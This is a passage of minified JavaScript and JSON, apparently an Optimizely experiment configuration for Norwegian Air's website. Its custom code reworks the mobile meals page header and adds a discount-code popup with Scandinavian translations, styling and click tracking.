                                  seeMoreMenu: "Se menyen og les mer om mat om bord"
                                },
                                se: {
                                  MealTopUp: "Behöver du fylla på bränsledepåerna under flygresan?",
                                  preorderMeal: "Förbeställ upp till 72 timmar före avgång och njut av kontinental mat tillagad av fräscha ingredienser med en Norwegian twist på din flygresa.",
                                  seeMoreMenu: "Se meny och läs mer om måltider ombord"
                                },
                                dk: {
                                  MealTopUp: "Skal du have brændstof til din rejse?",
                                  preorderMeal: "Forudbestille dit lækre, varme måltid op til 72 timer i forvejen og nyd kontinentale retter tilberedt af friske ingredienser og et twist a la Norwegian på din rejse.",
                                  seeMoreMenu: "Se menuen og læs mere om måltider ombord"
                                }
                              },
                              host = window.location.hostname.replace("www.norwegian.", "");
                            "no" !== host && (host = window.location.pathname.split("/")[1]), function () {
                              var observer,
                                listeners = [],
                                doc = window.document,
                                MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                              function check() {
                                for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                                  listener = listeners[i];
                                  for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).ready || (element.ready = []), element.ready[i] || (element.ready[i] = !0, listener.fn.call(element, element));
                                }
                              }
                              window.optiReady = function (selector, fn) {
                                listeners.push({
                                  selector: selector,
                                  fn: fn
                                }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                                  childList: !0,
                                  subtree: !0
                                }), check();
                              };
                            }(), window.optiReady('.col-8--lg [data-ui-view="maincontent"] .page-header', function (ele) {
                              ele.innerHTML = '<div class="parent_div">\n        <div>\n               <h3 id="parent_divh3_text"> '.concat(t126MealsImageMenuTranslations[host].MealTopUp, '</h3>\n                <p class="ptagofmobiledata">').concat(t126MealsImageMenuTranslations[host].preorderMeal, '</p>\n        </div>\n         <div class="page_headerimgs">\n         <img src="https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/lifestyledish.jpg" width="45%"\n             id="nor_mobimg_one">\n         <img src="https://www.norwegian.com/globalassets/ip/media/travelling-with-us/on-board/food-and-drinks/may23/classicdishhotlunchdinnerscandi.jpg" width="45%">\n         </div>\n         <div class="anchortag_mob"> <button> ').concat(t126MealsImageMenuTranslations[host].seeMoreMenu, "</button> </div>"), waitUntil(function () {
                                return null !== document.querySelector('body.nor_T126_mob div[meal-selections="vm.mealSelections"] p .link[data-translate="MealSalesReadMore"]');
                              }).then(function () {
                                document.querySelector(".anchortag_mob").addEventListener("click", function () {
                                  document.querySelector('body.nor_T126_mob div[meal-selections="vm.mealSelections"] p .link[data-translate="MealSalesReadMore"]').click();
                                });
                              });
                            });
                          }
                          __webpack_require__.r(__webpack_exports__), console.log("experiment"), function () {
                            waitUntil(function () {
                              return null !== document.querySelector(".page-header");
                            }).then(function () {
                              document.querySelector("body").classList.add("nor_T126_mob"), alldatatogethermobile();
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "48C376FE-C016-4209-9F68-ACAFF1A9D99F",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>@media (max-width: 760px){body.nor_T126_mob [data-ng-repeat=\"flightMeals in vm.mealSelections\"]+p{display:none}body.nor_T126_mob .col-8--lg .page-header{background:white}body.nor_T126_mob .col-8--lg .page-header span{display:none}body.nor_T126_mob .ptagofmobiledata{padding:20px 17px 24px 11px;font-size:16px;font-family:apercu, helvetica neue, Helvetica, Arial, sans-serif;font-weight:400;line-height:20.8px;color:#003251;margin-bottom:0}body.nor_T126_mob .page_headerimgs{display:flex;flex-wrap:wrap;justify-content:center;align-items:center}body.nor_T126_mob .anchortag_mob{padding:15px}body.nor_T126_mob #nor_mobimg_one{margin-right:10px}body.nor_T126_mob #parent_divh3_text{display:none}body.nor_T126_mob .anchortag_mob button{color:#D81939;font-style:normal;font-weight:400;font-size:16px;line-height:20.8px;border-bottom:2px solid #d8d8d8}body.nor_T126_mob .page-cover__title{margin-bottom:22px}body.nor_T126_mob .page-cover__content{padding-bottom:unset}}@media only screen and (max-width: 375px) and (min-width: 342px){body.nor_T126_mob .anchortag_mob button{font-size:14px}body.nor_T126_mob .ptagofmobiledata{font-size:14px}}@media (max-width: 341px){body.nor_T126_mob .anchortag_mob button{font-size:12px}body.nor_T126_mob .ptagofmobiledata{font-size:12px}}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "24294500467",
                  "endOfRange": 10000
                }],
                "name": "[QA]T126 / Meals / Meals image&menu / Mobile",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["24341690438"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": [{
                "id": "1E42B140-259B-4439-99C7-1215C26C1806",
                "type": "custom_code",
                "value": function ($) {
                  !function (modules) {
                    var installedModules = {};
                    function __webpack_require__(moduleId) {
                      if (installedModules[moduleId]) return installedModules[moduleId].exports;
                      var module = installedModules[moduleId] = {
                        i: moduleId,
                        l: !1,
                        exports: {}
                      };
                      return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                    }
                    __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                      __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                        enumerable: !0,
                        get: getter
                      });
                    }, __webpack_require__.r = function (exports) {
                      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                        value: "Module"
                      }), Object.defineProperty(exports, "__esModule", {
                        value: !0
                      });
                    }, __webpack_require__.t = function (value, mode) {
                      if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                      if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                      var ns = Object.create(null);
                      if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                        enumerable: !0,
                        value: value
                      }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                        return value[key];
                      }.bind(null, key));
                      return ns;
                    }, __webpack_require__.n = function (module) {
                      var getter = module && module.__esModule ? function () {
                        return module.default;
                      } : function () {
                        return module;
                      };
                      return __webpack_require__.d(getter, "a", getter), getter;
                    }, __webpack_require__.o = function (object, property) {
                      return Object.prototype.hasOwnProperty.call(object, property);
                    }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 3);
                  }([function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    function waitUntil(predicate) {
                      var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          predicate() && (resolve(predicate()), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, time);
                      });
                    }
                    __webpack_require__.d(__webpack_exports__, "a", function () {
                      return waitUntil;
                    });
                  }, function (module, exports) {
                    function push_API_only(nameOfEvent) {
                      window.optimizely = window.optimizely || [], window.optimizely.push({
                        type: "event",
                        eventName: nameOfEvent
                      });
                    }
                    module.exports = {
                      push_API_only: push_API_only,
                      optimizely_trackers_clicks: function (sel, apiName) {
                        var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                        jQuery(document).on(eventNameDevice, sel, function () {
                          push_API_only(apiName);
                        });
                      }
                    };
                  },, function (module, exports, __webpack_require__) {
                    module.exports = __webpack_require__(4);
                  }, function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    __webpack_require__.r(__webpack_exports__);
                    var _assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(0),
                      tracker = __webpack_require__(1);
                    !function () {
                      function norT133_SharedInit() {
                        var destinationListItems, pageName, handleClick;
                        console.log("********* T133 / Campaign page / Discount code / SE, NO, DK  || SHARED CODE*****"), destinationListItems = document.querySelectorAll(".nas-destination-list__item"), pageName = -1 !== window.location.pathname.indexOf("/summer-sale") ? "Campaign" : "Destinations", handleClick = function () {
                          tracker.push_API_only("Clicks_on_any_departure-".concat(pageName, " page"));
                        }, destinationListItems.forEach(function (element) {
                          element.addEventListener("click", handleClick);
                        });
                      }
                      Object(_assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__.a)(function () {
                        return null !== document.querySelector(".nas-destination-filter__search-filter ") || null !== document.querySelector("header.page-cover.page-cover--image.page-cover--shadowless.page-cover--small");
                      }).then(function () {
                        norT133_SharedInit();
                      });
                    }();
                  }]);
                },
                "dependencies": []
              }],
              "id": "24710250915",
              "name": "[DEV] T133 / Campaign page / Discount code / SE, NO, DK / Mobile",
              "commitId": "24810930006",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "17279193910", "17412550827"],
                "audienceName": "Test Cookie,Mobile users",
                "changes": null,
                "id": "24700480563",
                "integrationSettings": null,
                "variations": [{
                  "id": "24724060817",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "24710110773",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "24708031292",
                    "changes": [{
                      "id": "4d42ab8f6c0742fcb302a0d406164ded",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 2);
                        }([function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function waitUntil(predicate) {
                            var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                            return new Promise(function (resolve) {
                              var int = setInterval(function () {
                                predicate() && (resolve(predicate()), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("condition false"));
                              }, time);
                            });
                          }
                          __webpack_require__.d(__webpack_exports__, "a", function () {
                            return waitUntil;
                          });
                        }, function (module, exports) {
                          function push_API_only(nameOfEvent) {
                            window.optimizely = window.optimizely || [], window.optimizely.push({
                              type: "event",
                              eventName: nameOfEvent
                            });
                          }
                          module.exports = {
                            push_API_only: push_API_only,
                            optimizely_trackers_clicks: function (sel, apiName) {
                              var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                              jQuery(document).on(eventNameDevice, sel, function () {
                                push_API_only(apiName);
                              });
                            }
                          };
                        }, function (module, exports, __webpack_require__) {
                          __webpack_require__(5), module.exports = __webpack_require__(6);
                        },,, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          __webpack_require__.r(__webpack_exports__);
                          var utilitiesSeparate = __webpack_require__(0);
                          function norT133D_showPromoPopUp() {
                            var destinationActivationCode = document.querySelector(".nor_T133D_ActivatePromoCode .norT133D_destinationActivationCode");
                            Object(utilitiesSeparate.a)(function () {
                              return null !== document.querySelector(".nor_T133D_ActivatePromoCode .norT133D_destinationActivationCode");
                            }).then(function () {
                              destinationActivationCode && destinationActivationCode.addEventListener("click", function () {
                                document.querySelector("body").classList.add("norT133D_showCustomPopUp");
                              });
                            });
                          }
                          function norT133D_clickOnAddSaleCode() {
                            document.querySelector(".customSubmitButton").addEventListener("click", function () {
                              !function () {
                                var url = window.location.href,
                                  parameter = document.querySelector("#norT133D_campaignCode").value,
                                  paramName = "AgreementCode";
                                if (-1 !== url.indexOf("".concat(paramName, "="))) {
                                  var regex = new RegExp("([?&])".concat(paramName, "=[^&#]*(&|#|$)"), "i");
                                  url.match(regex) && (url = url.replace(regex, "$1"));
                                }
                                -1 === url.indexOf("?") ? url += "?".concat(paramName, "=").concat(parameter) : url.endsWith("?") || url.endsWith("&") ? url += "".concat(paramName, "=").concat(parameter) : url += "&".concat(paramName, "=").concat(parameter), window.location.href = url;
                              }();
                            });
                          }
                          function norT133D_setDestiAttPlaceHolder() {
                            console.log(" ** norT133D_setDestiAttPlaceHolder ** || Function");
                            var discountCouponCodeContent,
                              inputElement = document.querySelector("#norT133D_campaignCode"),
                              destinationSubmitCode = document.querySelector(".norT133D_destinationSubmitCode"),
                              promoCode = document.querySelector(".norT133D_PromoCode");
                            discountCouponCodeContent = destinationSubmitCode ? destinationSubmitCode.textContent : promoCode ? promoCode.textContent : "", console.log(discountCouponCodeContent, "PLACEHOLDER INIT"), inputElement.setAttribute("placeholder", discountCouponCodeContent), console.log(discountCouponCodeContent, "PLACEHOLDER"), inputElement.value = discountCouponCodeContent;
                          }
                          function norT133D_updateNewSaleCode() {
                            var queryString = window.location.search;
                            return new URLSearchParams(queryString).get("AgreementCode");
                          }
                          var tracker = __webpack_require__(1);
                          !function () {
                            function norT133D_addPopUp() {
                              var norT33D_popUpCTATrans, host;
                              document.querySelector("body").insertAdjacentHTML("afterbegin", (norT33D_popUpCTATrans = {
                                se: {
                                  mainHeading: "Din kampanjkod",
                                  primaryButtonRed: "Visa kampanjpriser",
                                  secondaryButtongrey: "Avbryt"
                                },
                                dk: {
                                  mainHeading: "Din kampagnekode",
                                  primaryButtonRed: "Vis kampagnepriser",
                                  secondaryButtongrey: "Annuller"
                                },
                                no: {
                                  mainHeading: "Din kampanjekode",
                                  primaryButtonRed: "Vis kampanjepriser",
                                  secondaryButtongrey: "Avbryt"
                                }
                              }, "no" !== (host = window.location.hostname.replace("www.norwegian.", "")) && (host = window.location.pathname.split("/")[1]), '<div class="norT133D_PromoPopUp">\n    <div class="norT133D-overlay"></div>\n    <div class="norT133D-PopUp-Details">\n        <span class="close-Popin"></span>\n        <h3>'.concat(norT33D_popUpCTATrans[host].mainHeading, '</h3>\n        <label class="input">\n            <input type="text" required="" id="norT133D_campaignCode" name="norT133D_campaignCode" class="input__text ng-pristine ng-invalid ng-touched">\n            <span class="input__line"></span></label><div class="norT133D_SubmitPromoCode">\n        <button class="customSubmitButton">').concat(norT33D_popUpCTATrans[host].primaryButtonRed, '</button>\n        <button class="customClosePopUpButton">').concat(norT33D_popUpCTATrans[host].secondaryButtongrey, "</button>\n    </div>\n    </div>\n</div>")));
                            }
                            function nor_T33D_Init() {
                              var host;
                              console.log("********* T133 / Campaign page / Discount code / SE, NO, DK || VARIATION ******"), document.querySelector("body").classList.add("nor_T133D_DiscountCode"), -1 !== window.location.pathname.indexOf("/summer-sale") ? (document.querySelector("body").classList.add("nor_T133D_SummerSalePage"), "no" !== (host = window.location.hostname.replace("www.norwegian.", "")) && (host = window.location.pathname.split("/")[1]), document.querySelector("nas-element-countdown + .page-section .grid .preamble:nth-child(2)").insertAdjacentHTML("beforeBegin", {
                                se: {
                                  summerSaleCodeActivation: '<div class="norT133D_SummerSaleHotCode">Kampanjkoden <span class="norT133D_summerSalePromoCode">HOTSUMDEALS</span> är aktiverad! </div>'
                                },
                                dk: {
                                  summerSaleCodeActivation: '<div class="norT133D_SummerSaleHotCode">Kampagnekode <span class="norT133D_summerSalePromoCode">HOTSUMDEALS</span> er aktiveret!</div>'
                                },
                                no: {
                                  summerSaleCodeActivation: '<div class="norT133D_SummerSaleHotCode">Kampanjekoden <span class="norT133D_summerSalePromoCode">HOTSUMDEALS</span> er aktivert!</div>'
                                }
                              }[host].summerSaleCodeActivation)) : (document.querySelector("body").classList.add("nor_T133D_DestinationSalePage"), norT133D_addPopUp(), function () {
                                var norT33D_DestinationTranslations = {
                                    se: {
                                      destiPromoCode: "Nu har vi kampanjpriser på utvalda rutter! ",
                                      destinationCodeActivation: "Klicka här för att aktivera kampanjkoden"
                                    },
                                    dk: {
                                      destiPromoCode: "Vi har nu kampagnepriser på udvalgte ruter! ",
                                      destinationCodeActivation: "Klik her for at aktivere kampagnekoden"
                                    },
                                    no: {
                                      destiPromoCode: "Vi har nå kampanjepriser på utvalgte ruter! ",
                                      destinationCodeActivation: "Klikk her for å aktivere kampanjekoden"
                                    }
                                  },
                                  host = window.location.hostname.replace("www.norwegian.", "");
                                "no" !== host && (host = window.location.pathname.split("/")[1]);
                                var norT33D_Destination_promoCode = {
                                  html: '\n        <div class="nor_T133D_ActivatePromoCode norT133D_SubmittedDestinationDesign">\n        <p>'.concat(norT33D_DestinationTranslations[host].destiPromoCode, '<span class="norT133D_destinationActivationCode highlightCustomClasst133D">').concat(norT33D_DestinationTranslations[host].destinationCodeActivation, '  <span class="norT133D_PromoCode">HOTSUMDEALS</span> </span>\n        </p>\n      </div>\n        ')
                                };
                                document.querySelector(".nas-travel-tip").insertAdjacentHTML("beforebegin", norT33D_Destination_promoCode.html);
                              }(), norT133D_setDestiAttPlaceHolder(), norT133D_showPromoPopUp(), document.querySelector(".norT133D_PromoPopUp").addEventListener("click", function (closePopIn) {
                                var body = document.querySelector("body"),
                                  target = closePopIn.target;
                                (target.classList.contains("close-Popin") || target.classList.contains("norT133D-overlay") || target.classList.contains("customClosePopUpButton")) && body.classList.remove("norT133D_showCustomPopUp");
                              }), norT133D_clickOnAddSaleCode(), norT133D_updateNewSaleCode(), Object(utilitiesSeparate.a)(function () {
                                return null !== document.querySelector(".norT133D_destinationActivationCode");
                              }).then(function () {
                                document.querySelector(".norT133D_destinationActivationCode") && document.querySelector(".norT133D_destinationActivationCode").addEventListener("click", function () {
                                  tracker.push_API_only("Clicks_on_Activate_code-Destinations page");
                                });
                              }), Object(utilitiesSeparate.a)(function () {
                                return null !== document.querySelector(".norT133D_ChangePromoCode");
                              }).then(function () {
                                document.querySelector(".nor_T133D_DestinationSalePage .norT133D_ChangePromoCode") && document.querySelector(".nor_T133D_DestinationSalePage .norT133D_ChangePromoCode").addEventListener("click", function () {
                                  tracker.push_API_only("Clicks_on_Edit_code-Destinations page");
                                });
                              }), document.querySelectorAll(".nas-destination-list__item").forEach(function (ele) {
                                ele.addEventListener("click", function () {
                                  tracker.push_API_only("Clicks_on_any_departure-Destinations page");
                                });
                              }), document.querySelector(".customSubmitButton").addEventListener("click", function () {
                                tracker.push_API_only("Clicks_on_CTA_in_popup-Campaign page");
                              }), window.location.href.indexOf("AgreementCode") > -1 && function () {
                                var norT33D_SummerSaleTranslations = {
                                    se: {
                                      destinationSubmitCode: "Nu har vi kampanjpriser på utvalda rutter!",
                                      summerSaleCodeActivation: ' Kampankoden <span class="norT133D_destinationSubmitCode"></span> är aktiverad!',
                                      changePromoCode: "Ändra kampanjekoden?"
                                    },
                                    dk: {
                                      destinationSubmitCode: "Vi har nu kampagnepriser på udvalgte ruter!",
                                      summerSaleCodeActivation: ' Kampagnekode <span class="norT133D_destinationSubmitCode"></span> er aktiveret!',
                                      changePromoCode: "Vil du ændre kampagnekode?"
                                    },
                                    no: {
                                      destinationSubmitCode: "Nå har vi kampanjepriser på utvalgte ruter!",
                                      summerSaleCodeActivation: ' Kampanjekode <span class="norT133D_destinationSubmitCode"></span> er aktivert!',
                                      changePromoCode: "Vil du endre kampanjekode?"
                                    }
                                  },
                                  host = window.location.hostname.replace("www.norwegian.", "");
                                "no" !== host && (host = window.location.pathname.split("/")[1]);
                                var norT133D_DestinationCodeSubkitHTML = {
                                  html: '\n        <div class="nor_T133D_HOtSumPromoCodeSubmit norT133D_SubmittedDestinationDesign">\n        <p>'.concat(norT33D_SummerSaleTranslations[host].destinationSubmitCode, '<span class="norT133D_SummerActivationCode">').concat(norT33D_SummerSaleTranslations[host].summerSaleCodeActivation, '</span><br><span class="norT133D_ChangePromoCode">').concat(norT33D_SummerSaleTranslations[host].changePromoCode, "</span></p>\n      </div>")
                                };
                                document.querySelector(".nor_T133D_ActivatePromoCode").remove(), document.querySelector(".nas-travel-tip").insertAdjacentHTML("beforebegin", norT133D_DestinationCodeSubkitHTML.html), setTimeout(function () {
                                  document.querySelector(".norT133D_destinationSubmitCode").textContent = norT133D_updateNewSaleCode();
                                }, 800), document.querySelector(".nor_T133D_DestinationSalePage .norT133D_ChangePromoCode").addEventListener("click", function () {
                                  document.querySelector("body").classList.add("norT133D_showCustomPopUp"), norT133D_setDestiAttPlaceHolder();
                                });
                              }(), function () {
                                var abandonedBasketData = localStorage.getItem("ngStorage-abandonedBasket");
                                if (abandonedBasketData) {
                                  var saleURL = JSON.parse(abandonedBasketData)[0].url,
                                    summerSaleAgreementCode = new URLSearchParams(saleURL).get("AgreementCode");
                                  Object(utilitiesSeparate.a)(function () {
                                    return null !== document.querySelector(".norT133D_destinationSubmitCode");
                                  }).then(function () {
                                    document.querySelector(".norT133D_destinationSubmitCode") && (document.querySelector(".norT133D_destinationSubmitCode").textContent = summerSaleAgreementCode);
                                  });
                                } else norT133D_updateNewSaleCode();
                              }());
                            }
                            Object(utilitiesSeparate.a)(function () {
                              return null !== document.querySelector(".nas-destination-filter__search-filter ") || null !== document.querySelector("header.page-cover.page-cover--image.page-cover--shadowless.page-cover--small");
                            }).then(function () {
                              nor_T33D_Init();
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "3a830eba7d454340aecee7939bb4aec6",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>.nor_T133D_DiscountCode .norT133D_SubmittedDestinationDesign {\n    margin-bottom: 68px;\n    margin-top: -34px;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmittedDestinationDesign p {\n    font-family: Apercu,Helvetica Neue,Helvetica,Arial,sans-serif;\n    margin: 0;\n    font-size: 18px;\n    font-weight: 400;\n    line-height: 24px;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmittedDestinationDesign p span {\n    font-weight: 800;\n    cursor: pointer;\n    position: relative;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmittedDestinationDesign p .highlightCustomClasst133D::after {\n    content: '';\n    position: absolute;\n    background-color: #E3E3E3;\n    display: inline;\n    width: 100%;\n    height: 2px;\n    left: 0;\n    bottom: 0;\n}\n.nor_T133D_DiscountCode .norT133D_SubmittedDestinationDesign p .highlightCustomClasst133D:hover:after {\n    background-color: #003251;\n}\n.nor_T133D_DiscountCode .norT133D_PromoPopUp, .norT133D-overlay {\n    height: 100vh;\n    width: 100vw;\n    position: fixed;\n    left: 0;\n    z-index: 999999;\n    top: 0;\n    display: none;\n}\n.nor_T133D_DiscountCode.norT133D_showCustomPopUp .norT133D_PromoPopUp, .nor_T133D_DiscountCode.norT133D_showCustomPopUp .norT133D-overlay {\n    display: block;\n}\n.nor_T133D_DiscountCode .norT133D-overlay {\n    background: #000f18b3;\n}\n\n.nor_T133D_DiscountCode .norT133D-PopUp-Details {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    z-index: 9999999;\n    background-color: #e3e3e3;\n    padding: 36px;\n    box-shadow: 0 0 50px #0000001a;\n    max-width: 460px;\n    width: 100%;\n    animation: 800ms cubic-bezier(0.19, 1, 0.22, 1) 0s 1 normal both running animation-hlpob40iy;\n}\n\n.nor_T133D_DiscountCode .norT133D-PopUp-Details h3 {\n    margin-bottom: 24px;\n    font-size: 24px;\n    line-height: 30px;\n}\n\n.nor_T133D_DiscountCode .close-Popin {\n    display: inline-block;\n    vertical-align: middle;\n    width: 32px;\n    height: 32px;\n    background-image: url('data:image/svg+xml,%3C%3Fxml version%3D%221.0%22 encoding%3D%22utf-8%22%3F%3E%3C!-- Generator%3A Adobe Illustrator 18.0.0%2C SVG Export Plug-In . SVG Version%3A 6.00 Build 0)  --%3E%3C!DOCTYPE svg PUBLIC %22-%2F%2FW3C%2F%2FDTD SVG 1.1%2F%2FEN%22 %22http%3A%2F%2Fwww.w3.org%2FGraphics%2FSVG%2F1.1%2FDTD%2Fsvg11.dtd%22%3E%3Csvg version%3D%221.1%22 id%3D%22Layer_1%22 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22 x%3D%220px%22 y%3D%220px%22%09 width%3D%2224px%22 height%3D%2224px%22 viewBox%3D%220 0 24 24%22 enable-background%3D%22new 0 0 24 24%22 xml%3Aspace%3D%22preserve%22%3E%3Cpolygon fill%3D%22%23909090%22 points%3D%2218.3%2C7.8 16.2%2C5.7 12%2C9.9 7.8%2C5.7 5.7%2C7.8 9.9%2C12 5.7%2C16.2 7.8%2C18.3 12%2C14.1 16.2%2C18.3 18.3%2C16.2 %0914.1%2C12 %22%2F%3E%3C%2Fsvg%3E');\n    background-repeat: no-repeat;\n    background-position: center;\n    position: absolute;\n    right: 12px;\n    top: 12px;\n    cursor: pointer;\n}\n\n.nor_T133D_DiscountCode .close-Popin:hover {\n    width: 32px;\n    height: 32px;\n    border-radius: 50%;\n    background-color: #f1f1f1;\n    right: 12px;\n    top: 12px;\n    background-position: center;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmitPromoCode {\n    display: flex;\n    align-items: baseline;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmitPromoCode .customSubmitButton {\n    margin: 16px 24px 0 0;\n    color: #fff;\n    background-color: #d81939;\n    padding: 12px 24px;\n    font-family: \"Apercu\",\"Helvetica Neue\",Helvetica,Arial,sans-serif;\n    font-weight: 600;\n    font-size: 16px;\n    line-height: 26px;\n    text-align: center;\n    transition: all .15s cubic-bezier(0,0,.1,1);\n    position: relative;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmitPromoCode .customSubmitButton::after {\n    content: '';\n    position: absolute;\n    background: #003251;\n    display: block;\n    width: 100%;\n    height: 3px;\n    bottom: -6px;\n    left: 0;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmitPromoCode .customSubmitButton:hover {\n    background: #cd1836;\n}\n\n.nor_T133D_DiscountCode .norT133D_SubmitPromoCode .customClosePopUpButton {\n    padding: 0;\n    margin: 0;\n    background: none;\n    color: #003251;\n    border-bottom: 2px solid #d8d8d8;\n    font-size: 16px;\n    font-weight: 600;\n}\n\n.nor_T133D_DiscountCode .customClosePopUpButton:hover {\n    border-color: #003251;\n}\n\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage .norT133D_SubmittedDestinationDesign {\n    max-width: 1180px;\n    padding-left: 24px;\n    padding-right: 24px;\n    margin: 0 auto;\n    margin-top: 34px;\n}\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage .norT133D_SubmittedDestinationDesign p span {\n    font-weight: 400;\n}\n\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage .norT133D_summerSalePromoCode,\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage .norT133D_ChangePromoCode{\n    font-weight: 800 !important;\n}\n\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage  .norT133D_SummerActivationCode,\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage .norT133D_summerSalePromoCode {\n    cursor: unset !important;\n}\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage .nor_T133D_HOtSumPromoCodeSubmit span.norT133D_SummerActivationCode {\n    font-weight: 400 !important;\n}\n.nor_T133D_DiscountCode.nor_T133D_SummerSalePage nas-element-countdown + section.page-section p.preamble:nth-of-type(2) {\n    display: none !important;\n}\n\n.norT133D_SummerSaleHotCode {\n    font-size: 18px;\n}\n@media screen and (max-width: 767px) {\n\t  .nor_T133D_DiscountCode .norT133D-PopUp-Details {\n\t    width: calc(100% - 30px);\n\t}\n}\n@media screen and (max-width: 355px) {\n\t.nor_T133D_DiscountCode .norT133D_SubmitPromoCode .customSubmitButton {\n\t    font-size: 13px;\n\t    padding: 12px 15px;\n\t}\n}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "24710110773",
                  "endOfRange": 10000
                }],
                "name": "[DEV] T133 / Campaign page / Discount code / SE, NO, DK / Mobile",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["24708031292"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": [{
                "id": "732684D6-AEFF-42D6-94D3-3D2ECD56D1D2",
                "type": "custom_code",
                "value": function ($) {
                  !function (modules) {
                    var installedModules = {};
                    function __webpack_require__(moduleId) {
                      if (installedModules[moduleId]) return installedModules[moduleId].exports;
                      var module = installedModules[moduleId] = {
                        i: moduleId,
                        l: !1,
                        exports: {}
                      };
                      return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                    }
                    __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                      __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                        enumerable: !0,
                        get: getter
                      });
